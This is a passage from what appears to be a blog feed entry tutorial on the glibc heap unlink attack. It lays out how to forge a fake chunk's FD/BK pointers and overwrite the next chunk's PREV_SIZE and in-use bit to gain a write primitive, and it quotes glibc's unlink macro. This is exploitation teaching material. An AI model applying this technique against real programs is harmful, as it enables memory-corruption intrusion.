style="text-align:center">FD(<font color="blue">faked</font>)(<font color="red">malloc_return - word_size * 3</font>)</td><td style="text-align:center">BK(<font color="blue">faked</font>)(<font color="red">malloc_return - word_size * 2</font>)</td></tr><tr><td style="text-align:center">……</td><td style="text-align:center">……</td></tr><tr><td style="text-align:center"><strong> PREV_SIZE<font color="red"> (&amp;LABEL_FREEING - &amp;LABEL_fake) </font></strong></td><td style="text-align:center"><font color="red"><strong> SIZE(lowest bit set to 0) </strong></font></td></tr></tbody></table><p>So, we get the <font color="red">PTR</font> to the LABEL of the fake chunk by <strong> using the malloc return of previous chunk </strong>.</p><h4 id="2-write-heap-to-make-a-fake-LABEL"><a href="#2-write-heap-to-make-a-fake-LABEL" class="headerlink" title="(2) write heap to make a fake LABEL"></a>(2) write heap to make a <font color="red">fake LABEL</font></h4><p><strong>PREV_SIZE</strong>: Any Value<br><strong>SIZE</strong>: Any Value<br><strong>FD</strong>: <font color="red"> the address of <strong>PTR</strong>(mentioned above) - word_size * 3</font> (we need FD-&gt;bk)<br><strong>BK</strong>: <font color="red"> the address of <strong>PTR</strong>(mentioned above) - word_size * 2</font> (we need BK-&gt;fd)</p><h4 id="3-overwrite-the-chunk-FREEING"><a href="#3-overwrite-the-chunk-FREEING" class="headerlink" title="(3) overwrite the chunk FREEING"></a>(3) <font color="red">overwrite </font>the chunk <font color="red"><strong>FREEING</strong></font></h4><ul><li>&amp;LABEL(FREEING chunk) - PREV_SIZE(FREEING chunk) == &amp;LABEL(fake chunk)<ul><li>So, PREV_SIZE(FREEING chunk) should be the value of <font color="red"><strong>&amp;LABEL(FREEING chunk) minus &amp;LABEL(fake chunk)</strong></font></li></ul></li><li>The lowest bit of SIZE(FREEING chunk) which <strong>marking whether the PREV_chunk been used </strong> as <font color="red">0</font></li></ul><h2 id="WHAT-HAPPENED-WHEN-BAD-UNLINK-DONE"><a href="#WHAT-HAPPENED-WHEN-BAD-UNLINK-DONE" class="headerlink" title="WHAT HAPPENED WHEN BAD UNLINK DONE"></a>WHAT HAPPENED WHEN BAD UNLINK DONE</h2><ul><li>The <font color="red">FD->bk (PTR - word_size * 3 + word_size * 3) </font> is set as BK, which is <font color="red">PTR - word_size * 2</font></li><li>The <font color="red">BK->fd (PTR - word_size * 2 + word_size * 2 </font> is set as FD, which is <font color="red">PTR - word_size * 3</font></li><li>So the ptr list has been destroyed, but the mem between ptrs has been <strong>free()’d</strong>.</li><li>Next time we call malloc, we will get the mem and can write it easily;</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;HEAP-UNLINK-ATTACK&quot;&gt;&lt;a href=&quot;#HEAP-UNLINK-ATTACK&quot; class=&quot;headerlink&quot; title=&quot;HEAP UNLINK ATTACK&quot;&gt;&lt;/a&gt;HEAP UNLINK ATTACK&lt;/h1&gt;&lt;h2 id=&quot;WHAT-IS-UNLINK&quot;&gt;&lt;a href=&quot;#WHAT-IS-UNLINK&quot; class=&quot;headerlink&quot; title=&quot;WHAT IS UNLINK&quot;&gt;&lt;/a&gt;WHAT IS UNLINK&lt;/h2&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; unlink(P, BK, FD) &amp;#123;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    FD = P-&amp;gt;fd;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    BK = P-&amp;gt;bk;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (__builtin_expect (FD-&amp;gt;bk != P || BK-&amp;gt;fd != P, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      malloc_printerr (check_action, &lt;span class=&quot;string&quot;&gt;&quot;corrupted double-linked list&quot;&lt;/span&gt;, P);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        FD-&amp;gt;bk = BK;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        BK-&amp;gt;fd = FD;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!in_smallbin_range (P-&amp;gt;size)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;amp;&amp;amp; __builtin_expect (P-&amp;gt;fd_nextsize != &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            assert (P-&amp;gt;fd_nextsize-&amp;gt;bk_nextsize == P);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            assert (P-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize == P);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (FD-&amp;gt;fd_nextsize == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (P-&amp;gt;fd_nextsize == P)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                  FD-&amp;gt;fd_nextsize = FD-&amp;gt;bk_nextsize = FD;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    FD-&amp;gt;fd_nextsize = P-&amp;gt;fd_nextsize;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    FD-&amp;gt;bk_nextsize = P-&amp;gt;bk_nextsize;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    P-&amp;gt;fd_nextsize-&amp;gt;bk_nextsize = FD;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    P-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = FD;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                P-&amp;gt;fd_nextsize-&amp;gt;bk_nextsize = P-&amp;gt;bk_nextsize;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                P-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = P-&amp;gt;fd_nextsize;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="PWN" scheme="http://blog.flier.net.cn/categories/PWN/"/>
    
    
      <category term="PWN" scheme="http://blog.flier.net.cn/tags/PWN/"/>
    
      <category term="HEAP" scheme="http://blog.flier.net.cn/tags/HEAP/"/>
    
  </entry>
  
</feed>
